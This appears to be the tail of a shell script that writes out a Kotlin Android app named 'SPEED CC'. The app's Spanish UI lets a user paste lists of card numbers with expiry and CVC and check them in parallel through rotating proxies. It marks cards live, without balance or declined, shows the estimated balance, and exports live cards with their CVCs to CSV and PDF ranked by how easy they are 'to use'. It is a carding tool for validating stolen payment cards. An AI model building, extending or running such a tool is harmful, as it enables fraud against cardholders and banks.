            horizontalAlignment = Alignment.CenterHorizontally
        ) {
            Text("La velocidad es tu ventaja", color = BLANCO, fontSize = 13.sp)
            Spacer(Modifier.height(8.dp))
            Box(Modifier.width(70.dp).height(2.dp).background(DORADO, RoundedCornerShape(50)))
        }
    }
}

@Composable
fun App() {
    val ctx = LocalContext.current
    val scope = rememberCoroutineScope()
    var splash by remember { mutableStateOf(true) }
    var tab by remember { mutableIntStateOf(0) }
    var revisando by remember { mutableStateOf(false) }
    var texto by remember { mutableStateOf(Ajustes.s(ctx, "lista", "")) }
    var completo by remember { mutableStateOf(Ajustes.b(ctx, "ladder", true)) }
    var corriendo by remember { mutableStateOf(false) }
    var progreso by remember { mutableFloatStateOf(0f) }
    var estadoTxt by remember { mutableStateOf("Pega tu lista y pulsa COMENZAR.") }
    val resultados = remember { mutableStateListOf<Result>() }
    var job by remember { mutableStateOf<Job?>(null) }
    var wv by remember { mutableStateOf<WebView?>(null) }

    fun lanzar(cards: List<Card>, reemplazar: Boolean) {
        if (cards.isEmpty() || corriendo) return
        corriendo = true
        if (reemplazar) resultados.clear()
        progreso = 0f
        val hilos = Ajustes.i(ctx, "hilos", 4).coerceIn(1, 8)
        val clave = Ajustes.s(ctx, "clave_bin", "")
        val proxys = Ajustes.s(ctx, "proxies", "").split("\n").map { it.trim() }.filter { it.isNotEmpty() }
        val sem = Semaphore(hilos)
        job = scope.launch {
            var done = 0
            try {
                coroutineScope {
                    cards.map { c ->
                        async {
                            val proxy = if (proxys.isEmpty()) null else Checker.prepararProxy(proxys.random())
                            val r = sem.withPermit { Checker.check(c, ctx, completo, completo, clave, proxy) }
                            withContext(Dispatchers.Main) {
                                resultados.removeAll { it.idx == c.idx }
                                resultados.add(r); done++
                                progreso = done.toFloat() / cards.size
                                estadoTxt = "$done de ${cards.size}  ·  válidas: ${resultados.count { it.isLive }}"
                            }
                        }
                    }.awaitAll()
                }
                val ord = resultados.sortedWith(Orden.comparador)
                resultados.clear(); resultados.addAll(ord)
                Historial.add(ctx, Run(System.currentTimeMillis(), System.currentTimeMillis(), ord))
                estadoTxt = "Listo. ${cards.size} revisadas  ·  ${ord.count { it.isLive }} válidas."
            } catch (e: CancellationException) {
                estadoTxt = "Detenido. ${resultados.count { it.isLive }} válidas."
            } finally { corriendo = false; job = null }
        }
    }

    if (splash) { Splash { splash = false }; return }

    Scaffold(
        containerColor = NEGRO,
        contentColor = BLANCO,
        bottomBar = {
            NavigationBar(containerColor = Color(0xFF101010)) {
                NavigationBarItem(
                    selected = tab == 0 && !revisando,
                    onClick = { tab = 0; revisando = false },
                    icon = { Icon(Icons.Filled.Home, null) },
                    label = { Text("Inicio", fontSize = 11.sp) },
                    colors = navColors()
                )
                NavigationBarItem(
                    selected = tab == 1,
                    onClick = { tab = 1; revisando = false },
                    icon = { Icon(Icons.Filled.List, null) },
                    label = { Text("Historial", fontSize = 11.sp) },
                    colors = navColors()
                )
                NavigationBarItem(
                    selected = tab == 2,
                    onClick = { tab = 2; revisando = false },
                    icon = { Icon(Icons.Filled.Settings, null) },
                    label = { Text("Ajustes", fontSize = 11.sp) },
                    colors = navColors()
                )
            }
        }
    ) { pad ->
        Box(Modifier.fillMaxSize().padding(pad)) {
            when {
                tab == 0 && revisando -> PantallaRevisar(
                    texto = texto,
                    onTexto = { texto = it; Ajustes.put(ctx, "lista", it) },
                    resultados = resultados,
                    completo = completo,
                    onModo = { completo = it; Ajustes.putB(ctx, "ladder", it) },
                    corriendo = corriendo,
                    progreso = progreso,
                    estadoTxt = estadoTxt,
                    wv = wv,
                    onAtras = { revisando = false },
                    onLanzar = { lanzar(it, true) },
                    onDetener = { job?.cancel() },
                    onReintentar = {
                        lanzar(resultados
                            .filter { it.state in setOf("CONN_ERROR", "RETRY", "DECLINED") }
                            .map { Card(it.idx, it.num, it.mm, it.yy, it.cvc) }, false)
                    }
                )
                tab == 0 -> PantallaInicio(
                    onRevisar = { tab = 0; revisando = true },
                    onHistorial = { tab = 1 },
                    onAjustes = { tab = 2 }
                )
                tab == 1 -> PantallaHistorial(wv)
                else -> PantallaAjustes(onLimpiar = {
                    texto = ""; Ajustes.put(ctx, "lista", ""); resultados.clear()
                })
            }
            AndroidView(
                factory = { c -> WebView(c).also { it.settings.javaScriptEnabled = true; wv = it } },
                modifier = Modifier.size(2.dp)
            )
        }
    }
}

@Composable
fun PantallaInicio(onRevisar: () -> Unit, onHistorial: () -> Unit, onAjustes: () -> Unit) {
    LazyColumn(Modifier.fillMaxSize(), contentPadding = PaddingValues(16.dp)) {
        item {
            Row(Modifier.fillMaxWidth(), verticalAlignment = Alignment.CenterVertically) {
                Icon(Icons.Filled.Menu, null, tint = BLANCO)
                Spacer(Modifier.weight(1f))
                Marca(false)
                Spacer(Modifier.weight(1f))
                Icon(Icons.Filled.Star, null, tint = DORADO)
            }
            Spacer(Modifier.height(18.dp))
            Tarjeta {
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Box(
                        Modifier.size(48.dp).clip(RoundedCornerShape(14.dp))
                            .background(DORADO.copy(alpha = 0.14f)),
                        contentAlignment = Alignment.Center
                    ) { Rayo(24.dp) }
                    Spacer(Modifier.width(12.dp))
                    Column {
                        Text("SPEED CC", color = BLANCO, fontWeight = FontWeight.Bold, fontSize = 17.sp)
                        Text("Sistema listo para usar", color = GRIS, fontSize = 12.sp)
                    }
                }
                Spacer(Modifier.height(14.dp))
                Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                    MiniBadge(Icons.Filled.CheckCircle, "Online", "Conectado")
                    MiniBadge(Icons.Filled.CheckCircle, "Seguro", "Protegido")
                    MiniBadge(Icons.Filled.CheckCircle, "Rápido", "Optimizado")
                }
                Spacer(Modifier.height(16.dp))
                BotonDorado("INICIAR REVISIÓN", Icons.Filled.PlayArrow, onClick = onRevisar)
            }
            Spacer(Modifier.height(22.dp))
            Text("FUNCIONES PRINCIPALES", color = GRIS2, fontSize = 11.sp, letterSpacing = 2.sp)
            Spacer(Modifier.height(6.dp))
            FilaFuncion(Icons.Filled.Refresh, "Revisar", "Valida tus tarjetas", onRevisar)
            FilaFuncion(Icons.Filled.List, "Historial", "Consulta tus resultados", onHistorial)
            FilaFuncion(Icons.Filled.Settings, "Ajustes", "Personaliza la app", onAjustes)
            Spacer(Modifier.height(18.dp))
        }
    }
}

@Composable
fun ModoTarjeta(titulo: String, sub: String, activo: Boolean, modifier: Modifier = Modifier, onClick: () -> Unit) {
    Surface(
        color = if (activo) DORADO.copy(alpha = 0.10f) else CARBON,
        shape = RoundedCornerShape(16.dp),
        border = BorderStroke(if (activo) 1.5.dp else 1.dp, if (activo) DORADO else BORDE),
        modifier = modifier.clickable { onClick() }
    ) {
        Column(Modifier.padding(14.dp)) {
            Icon(
                if (activo) Icons.Filled.CheckCircle else Icons.Filled.Refresh,
                null, tint = if (activo) DORADO else GRIS, modifier = Modifier.size(22.dp)
            )
            Spacer(Modifier.height(8.dp))
            Text(titulo, color = BLANCO, fontWeight = FontWeight.SemiBold, fontSize = 13.sp)
            Text(sub, color = GRIS2, fontSize = 11.sp)
        }
    }
}

@Composable
fun PantallaRevisar(
    texto: String, onTexto: (String) -> Unit,
    resultados: List<Result>,
    completo: Boolean, onModo: (Boolean) -> Unit,
    corriendo: Boolean, progreso: Float, estadoTxt: String,
    wv: WebView?,
    onAtras: () -> Unit, onLanzar: (List<Card>) -> Unit,
    onDetener: () -> Unit, onReintentar: () -> Unit
) {
    val ctx = LocalContext.current
    var ayuda by remember { mutableStateOf(false) }
    val picker = rememberLauncherForActivityResult(ActivityResultContracts.GetContent()) { uri ->
        uri?.let { ctx.contentResolver.openInputStream(it)?.bufferedReader()?.use { r -> onTexto(r.readText()) } }
    }

    if (ayuda) AlertDialog(
        onDismissRequest = { ayuda = false },
        containerColor = CARBON,
        confirmButton = { TextButton(onClick = { ayuda = false }) { Text("Entendido", color = DORADO) } },
        title = { Text("Cómo se usa", color = BLANCO) },
        text = {
            Column {
                Text("1. Pega tus tarjetas, una por línea.", color = BLANCO)
                Spacer(Modifier.height(6.dp))
                Text("2. Elige Modo Rápido o Modo Completo.", color = BLANCO)
                Spacer(Modifier.height(6.dp))
                Text("3. Pulsa COMENZAR y espera. Al final puedes guardar el PDF.", color = BLANCO)
                Spacer(Modifier.height(10.dp))
                Text("Verde = válida. Ámbar = existe sin saldo. Rojo = rechazada.", color = GRIS, fontSize = 12.sp)
            }
        }
    )

    LazyColumn(Modifier.fillMaxSize(), contentPadding = PaddingValues(16.dp)) {
        item {
            Row(Modifier.fillMaxWidth(), verticalAlignment = Alignment.CenterVertically) {
                IconButton(onClick = onAtras) { Icon(Icons.Filled.ArrowBack, null, tint = BLANCO) }
                Text("Revisar", color = BLANCO, fontSize = 20.sp, fontWeight = FontWeight.Bold)
            }
            Spacer(Modifier.height(8.dp))
            Tarjeta {
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Icon(Icons.Filled.Refresh, null, tint = DORADO, modifier = Modifier.size(18.dp))
                    Spacer(Modifier.width(8.dp))
                    Text("Ingresa tus tarjetas", color = BLANCO, fontWeight = FontWeight.SemiBold, fontSize = 16.sp)
                }
                Spacer(Modifier.height(4.dp))
                Text("Puedes pegar varias tarjetas separadas por líneas.", color = GRIS, fontSize = 12.sp)
                Spacer(Modifier.height(10.dp))
                OutlinedTextField(
                    value = texto, onValueChange = onTexto,
                    placeholder = {
                        Text("Ejemplo:\n4242424242424242|12|25|123", color = GRIS2, fontSize = 12.sp)
                    },
                    modifier = Modifier.fillMaxWidth().height(120.dp),
                    shape = RoundedCornerShape(12.dp),
                    textStyle = LocalTextStyle.current.copy(
                        fontFamily = FontFamily.Monospace, fontSize = 12.sp, color = BLANCO
                    ),
                    colors = OutlinedTextFieldDefaults.colors(
                        focusedBorderColor = DORADO,
                        unfocusedBorderColor = BORDE,
                        focusedTextColor = BLANCO,
                        unfocusedTextColor = BLANCO,
                        cursorColor = DORADO
                    )
                )
                Spacer(Modifier.height(10.dp))
                Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                    BotonSuave("Pegar", Icons.Filled.Add) {
                        val cm = ctx.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                        cm.primaryClip?.getItemAt(0)?.text?.toString()?.let { onTexto(it) }
                    }
                    BotonSuave("Archivo", Icons.Filled.List) { picker.launch("text/*") }
                    BotonSuave("Ayuda", Icons.Filled.Info) { ayuda = true }
                }
            }
            Spacer(Modifier.height(12.dp))
            Row(horizontalArrangement = Arrangement.spacedBy(10.dp)) {
                ModoTarjeta("Modo Rápido", "1-5 min", !completo, Modifier.weight(1f)) { onModo(false) }
                ModoTarjeta("Modo Completo", "5-15 min", completo, Modifier.weight(1f)) { onModo(true) }
            }
            Spacer(Modifier.height(14.dp))
            if (corriendo) {
                BotonDorado("DETENER", Icons.Filled.Close, onClick = onDetener)
                Spacer(Modifier.height(8.dp))
                LinearProgressIndicator(
                    progress = { progreso },
                    modifier = Modifier.fillMaxWidth().height(6.dp).clip(RoundedCornerShape(50)),
                    color = DORADO, trackColor = CARBON2
                )
            } else {
                BotonDorado("COMENZAR", Icons.Filled.PlayArrow, onClick = { onLanzar(Parser.parse(texto)) })
            }
            Spacer(Modifier.height(8.dp))
            Text(estadoTxt, color = GRIS, fontSize = 12.sp)
            if (resultados.isNotEmpty()) {
                Spacer(Modifier.height(8.dp))
                Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                    BotonSuave("CSV", Icons.Filled.Share) { compartirCsv(ctx, "vivas.csv", resultados.toList()) }
                    BotonSuave("PDF", Icons.Filled.DateRange) {
                        imprimirPdf(ctx, wv, "Speed CC", resultados.toList()) { }
                    }
                    BotonSuave("Reintentar", Icons.Filled.Refresh) { onReintentar() }
                }
            }
            Spacer(Modifier.height(14.dp))
        }
        itemsIndexed(resultados) { i, r -> FilaResultado(i + 1, r) }
        item { Spacer(Modifier.height(20.dp)) }
    }
}

@Composable
fun FilaResultado(n: Int, r: Result) {
    val c = colorEstado(r.state)
    Surface(
        color = CARBON, shape = RoundedCornerShape(14.dp),
        border = BorderStroke(1.dp, c.copy(alpha = 0.25f)),
        modifier = Modifier.fillMaxWidth().padding(vertical = 4.dp)
    ) {
        Column(Modifier.padding(12.dp)) {
            Row(verticalAlignment = Alignment.CenterVertically) {
                Text("$n", color = GRIS2, fontSize = 11.sp, modifier = Modifier.width(20.dp))
                Text(
                    r.num, color = BLANCO, fontFamily = FontFamily.Monospace,
                    fontSize = 12.sp, modifier = Modifier.weight(1f)
                )
                ChipEstado(r.state)
            }
            Spacer(Modifier.height(5.dp))
            val detalle = buildString {
                append(r.brand)
                if (r.tipo.isNotEmpty()) append("  ·  ${r.tipo}")
                if (r.banco.isNotEmpty()) append("  ·  ${r.banco}")
                if (r.pais.isNotEmpty()) append("  ·  ${r.pais}")
                append("  ·  ${r.mm}/${r.yy}")
                if (r.balance.isNotEmpty()) append("  ·  saldo ${r.balance}")
            }
            Text(detalle, color = GRIS, fontSize = 11.sp)
        }
    }
}

@Composable
fun PantallaHistorial(wv: WebView?) {
    val ctx = LocalContext.current
    var runs by remember { mutableStateOf<List<Run>>(emptyList()) }
    var sel by remember { mutableStateOf<Run?>(null) }
    var filtro by remember { mutableIntStateOf(0) }
    LaunchedEffect(Unit) { runs = Historial.load(ctx) }

    val s = sel
    if (s != null) { DetalleRun(ctx, wv, s) { sel = null }; return }

    val visibles = when (filtro) {
        1 -> runs.filter { it.vivas > 0 }
        2 -> runs.filter { it.vivas == 0 }
        else -> runs
    }

    LazyColumn(Modifier.fillMaxSize(), contentPadding = PaddingValues(16.dp)) {
        item {
            Text("Historial", color = BLANCO, fontSize = 20.sp, fontWeight = FontWeight.Bold)
            Spacer(Modifier.height(12.dp))
            Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                FiltroChip("Todos", filtro == 0) { filtro = 0 }
                FiltroChip("Válidas", filtro == 1) { filtro = 1 }
                FiltroChip("Rechazadas", filtro == 2) { filtro = 2 }
            }
            Spacer(Modifier.height(12.dp))
            if (visibles.isEmpty()) {
                Text("Todavía no hay chequeos guardados.", color = GRIS, fontSize = 13.sp)
                Spacer(Modifier.height(8.dp))
            }
            if (runs.isNotEmpty()) {
                TextButton(onClick = { Historial.clear(ctx); runs = emptyList() }) {
                    Text("Vaciar historial", color = DORADO, fontSize = 12.sp)
                }
            }
        }
        items(visibles) { r ->
            val c = if (r.vivas > 0) VERDE else ROJO
            Surface(
                color = CARBON, shape = RoundedCornerShape(16.dp),
                border = BorderStroke(1.dp, BORDE),
                modifier = Modifier.fillMaxWidth().padding(vertical = 5.dp).clickable { sel = r }
            ) {
                Row(Modifier.padding(14.dp), verticalAlignment = Alignment.CenterVertically) {
                    Box(
                        Modifier.size(42.dp).clip(RoundedCornerShape(12.dp))
                            .background(DORADO.copy(alpha = 0.12f)),
                        contentAlignment = Alignment.Center
                    ) { Rayo(20.dp) }
                    Spacer(Modifier.width(12.dp))
                    Column(Modifier.weight(1f)) {
                        Text(
                            SimpleDateFormat("dd/MM/yyyy  ·  HH:mm", Locale.getDefault()).format(Date(r.fecha)),
                            color = BLANCO, fontSize = 13.sp, fontWeight = FontWeight.SemiBold
                        )
                        Spacer(Modifier.height(2.dp))
                        Text("${r.total} revisadas  ·  ${r.vivas} válidas", color = GRIS, fontSize = 11.sp)
                    }
                    Surface(color = c.copy(alpha = 0.14f), shape = RoundedCornerShape(50)) {
                        Text(
                            if (r.vivas > 0) "${r.vivas} ✓" else "0",
                            color = c, fontSize = 11.sp, fontWeight = FontWeight.Bold,
                            modifier = Modifier.padding(horizontal = 9.dp, vertical = 3.dp)
                        )
                    }
                }
            }
        }
    }
}

@Composable
fun FiltroChip(texto: String, activo: Boolean, onClick: () -> Unit) {
    Surface(
        color = if (activo) DORADO else CARBON,
        shape = RoundedCornerShape(50),
        border = BorderStroke(1.dp, if (activo) DORADO else BORDE),
        modifier = Modifier.clickable { onClick() }
    ) {
        Text(
            texto, color = if (activo) NEGRO else GRIS, fontSize = 12.sp,
            fontWeight = FontWeight.SemiBold,
            modifier = Modifier.padding(horizontal = 14.dp, vertical = 7.dp)
        )
    }
}

@Composable
fun DetalleRun(ctx: Context, wv: WebView?, run: Run, onBack: () -> Unit) {
    val orden = run.results.sortedWith(Orden.comparador)
    LazyColumn(Modifier.fillMaxSize(), contentPadding = PaddingValues(16.dp)) {
        item {
            Row(Modifier.fillMaxWidth(), verticalAlignment = Alignment.CenterVertically) {
                IconButton(onClick = onBack) { Icon(Icons.Filled.ArrowBack, null, tint = BLANCO) }
                Column {
                    Text("Resultado", color = BLANCO, fontSize = 18.sp, fontWeight = FontWeight.Bold)
                    Text(
                        SimpleDateFormat("dd/MM/yyyy  ·  HH:mm", Locale.getDefault()).format(Date(run.fecha)),
                        color = GRIS, fontSize = 11.sp
                    )
                }
            }
            Spacer(Modifier.height(10.dp))
            Tarjeta {
                Text("${run.total} revisadas  ·  ${run.vivas} válidas", color = BLANCO, fontSize = 14.sp)
                Spacer(Modifier.height(10.dp))
                Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                    BotonSuave("Compartir CSV", Icons.Filled.Share) { compartirCsv(ctx, "vivas.csv", orden) }
                    BotonSuave("Guardar PDF", Icons.Filled.DateRange) {
                        imprimirPdf(ctx, wv, "Speed CC", orden) { }
                    }
                }
            }
            Spacer(Modifier.height(12.dp))
        }
        itemsIndexed(orden) { i, r -> FilaResultado(i + 1, r) }
        item { Spacer(Modifier.height(20.dp)) }
    }
}

@Composable
fun FilaAjuste(icono: ImageVector, titulo: String, sub: String) {
    Surface(
        color = CARBON, shape = RoundedCornerShape(14.dp), border = BorderStroke(1.dp, BORDE),
        modifier = Modifier.fillMaxWidth().padding(vertical = 4.dp)
    ) {
        Row(Modifier.padding(14.dp), verticalAlignment = Alignment.CenterVertically) {
            Icon(icono, null, tint = DORADO, modifier = Modifier.size(20.dp))
            Spacer(Modifier.width(12.dp))
            Column(Modifier.weight(1f)) {
                Text(titulo, color = BLANCO, fontSize = 14.sp, fontWeight = FontWeight.Medium)
                Text(sub, color = GRIS2, fontSize = 11.sp)
            }
            Icon(Icons.Filled.KeyboardArrowRight, null, tint = GRIS2)
        }
    }
}

@Composable
fun PantallaAjustes(onLimpiar: () -> Unit) {
    val ctx = LocalContext.current
    var clave by remember { mutableStateOf(Ajustes.s(ctx, "clave_bin", "")) }
    var hilos by remember { mutableStateOf(Ajustes.i(ctx, "hilos", 4).toString()) }
    var proxys by remember { mutableStateOf(Ajustes.s(ctx, "proxies", "")) }

    LazyColumn(Modifier.fillMaxSize(), contentPadding = PaddingValues(16.dp)) {
        item {
            Text("Ajustes", color = BLANCO, fontSize = 20.sp, fontWeight = FontWeight.Bold)
            Spacer(Modifier.height(14.dp))
            Tarjeta {
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Marca(false)
                    Spacer(Modifier.weight(1f))
                    Text("v2.1", color = GRIS2, fontSize = 12.sp)
                }
                Spacer(Modifier.height(8.dp))
                Text("Configura la velocidad y los datos de apoyo.", color = GRIS, fontSize = 12.sp)
            }
            Spacer(Modifier.height(20.dp))
            Text("GENERAL", color = GRIS2, fontSize = 11.sp, letterSpacing = 2.sp)
            Spacer(Modifier.height(8.dp))
            FilaAjuste(Icons.Filled.Refresh, "Velocidad", "Tarjetas a la vez (1 a 8)")
            OutlinedTextField(
                value = hilos,
                onValueChange = {
                    hilos = it.filter { ch -> ch.isDigit() }.take(1)
                    Ajustes.putI(ctx, "hilos", hilos.toIntOrNull()?.coerceIn(1, 8) ?: 4)
                },
                modifier = Modifier.width(90.dp),
                shape = RoundedCornerShape(12.dp),
                textStyle = LocalTextStyle.current.copy(color = BLANCO),
                colors = OutlinedTextFieldDefaults.colors(
                    focusedBorderColor = DORADO, unfocusedBorderColor = BORDE,
                    focusedTextColor = BLANCO, unfocusedTextColor = BLANCO, cursorColor = DORADO
                )
            )
            Spacer(Modifier.height(14.dp))
            FilaAjuste(Icons.Filled.Star, "Datos del banco", "Clave gratis de handyapi.com (opcional)")
            OutlinedTextField(
                value = clave,
                onValueChange = { clave = it; Ajustes.put(ctx, "clave_bin", it) },
                modifier = Modifier.fillMaxWidth(),
                singleLine = true,
                placeholder = { Text("Pega tu clave aquí", color = GRIS2, fontSize = 12.sp) },
                shape = RoundedCornerShape(12.dp),
                textStyle = LocalTextStyle.current.copy(color = BLANCO, fontSize = 13.sp),
                colors = OutlinedTextFieldDefaults.colors(
                    focusedBorderColor = DORADO, unfocusedBorderColor = BORDE,
                    focusedTextColor = BLANCO, unfocusedTextColor = BLANCO, cursorColor = DORADO
                )
            )
            Spacer(Modifier.height(14.dp))
            FilaAjuste(Icons.Filled.Build, "Proxies", "host:puerto  o  host:puerto:usuario:clave")
            OutlinedTextField(
                value = proxys,
                onValueChange = { proxys = it; Ajustes.put(ctx, "proxies", it) },
                modifier = Modifier.fillMaxWidth().height(110.dp),
                placeholder = { Text("Uno por línea", color = GRIS2, fontSize = 12.sp) },
                shape = RoundedCornerShape(12.dp),
                textStyle = LocalTextStyle.current.copy(
                    fontFamily = FontFamily.Monospace, fontSize = 12.sp, color = BLANCO
                ),
                colors = OutlinedTextFieldDefaults.colors(
                    focusedBorderColor = DORADO, unfocusedBorderColor = BORDE,
                    focusedTextColor = BLANCO, unfocusedTextColor = BLANCO, cursorColor = DORADO
                )
            )
            Spacer(Modifier.height(20.dp))
            Text("SEGURIDAD", color = GRIS2, fontSize = 11.sp, letterSpacing = 2.sp)
            Spacer(Modifier.height(8.dp))
            FilaAjuste(Icons.Filled.Lock, "Historial", "Se guarda solo en tu teléfono")
            Spacer(Modifier.height(18.dp))
            BotonDorado("CERRAR SESIÓN", Icons.Filled.Check) { onLimpiar() }
            Spacer(Modifier.height(8.dp))
            Text("Cerrar sesión limpia la lista pegada y los resultados en pantalla.",
                color = GRIS2, fontSize = 11.sp)
            Spacer(Modifier.height(24.dp))
        }
    }
}

fun compartirCsv(ctx: Context, nombre: String, rows: List<Result>) {
    if (rows.isEmpty()) return
    val head = listOf("#", "Numero", "Marca", "Tipo", "Banco", "Pais", "Exp", "CVC", "Estado", "Saldo", "AVS", "CVC", "Codigo")
    val sb = StringBuilder(head.joinToString(",")).append("\n")
    rows.forEachIndexed { i, r ->
        sb.append(listOf(i + 1, r.num, r.brand, r.tipo, r.banco, r.pais, "${r.mm}/${r.yy}", r.cvc,
            textoEstado(r.state), r.balance, r.avs, r.cvcCheck, r.decline)
            .joinToString(",") { "\"$it\"" }).append("\n")
    }
    val intent = Intent(Intent.ACTION_SEND).apply {
        type = "text/csv"; putExtra(Intent.EXTRA_SUBJECT, nombre); putExtra(Intent.EXTRA_TEXT, sb.toString())
    }
    ctx.startActivity(Intent.createChooser(intent, "Compartir"))
}

fun imprimirPdf(ctx: Context, wv: WebView?, titulo: String, rows: List<Result>, onDone: (Boolean) -> Unit) {
    if (wv == null || rows.isEmpty()) return
    val sb = StringBuilder()
    sb.append("<html><head><meta charset='utf-8'><style>")
    sb.append("@page{size:A4 landscape;margin:10mm}body{font-family:sans-serif;background:#fff;color:#111}")
    sb.append("h3{margin:0 0 4px;color:#B8912A}p{margin:0 0 10px;font-size:11px;color:#666}")
    sb.append("table{border-collapse:collapse;width:100%}")
    sb.append("th,td{border:1px solid #ccc;padding:3px;font-size:9px}")
    sb.append("th{background:#0B0B0B;color:#D4AF37}</style></head><body>")
    sb.append("<h3>$titulo</h3><p>Ordenado de las mas faciles de usar a las mas dificiles</p>")
    sb.append("<table><tr><th>#</th><th>Numero</th><th>Marca</th><th>Tipo</th><th>Banco</th>")
    sb.append("<th>Pais</th><th>Exp</th><th>CVC</th><th>Estado</th><th>Saldo est.</th>")
    sb.append("<th>AVS</th><th>CVC</th><th>Codigo</th></tr>")
    rows.forEachIndexed { i, r ->
        sb.append("<tr><td>${i + 1}</td><td>${r.num}</td><td>${r.brand}</td><td>${r.tipo}</td>")
        sb.append("<td>${r.banco}</td><td>${r.pais}</td><td>${r.mm}/${r.yy}</td><td>${r.cvc}</td>")
        sb.append("<td>${textoEstado(r.state)}</td><td>${r.balance}</td><td>${r.avs}</td>")
        sb.append("<td>${r.cvcCheck}</td><td>${r.decline}</td></tr>")
    }
    sb.append("</table></body></html>")
    wv.webViewClient = object : WebViewClient() {
        override fun onPageFinished(view: WebView, url: String) {
            onDone(true)
            val pm = ctx.getSystemService(Context.PRINT_SERVICE) as PrintManager
            pm.print("vivas", view.createPrintDocumentAdapter("vivas"), PrintAttributes.Builder().build())
        }
    }
    wv.loadDataWithBaseURL(null, sb.toString(), "text/html", "utf-8", null)
}
EOF

echo "== Speed CC listo =="
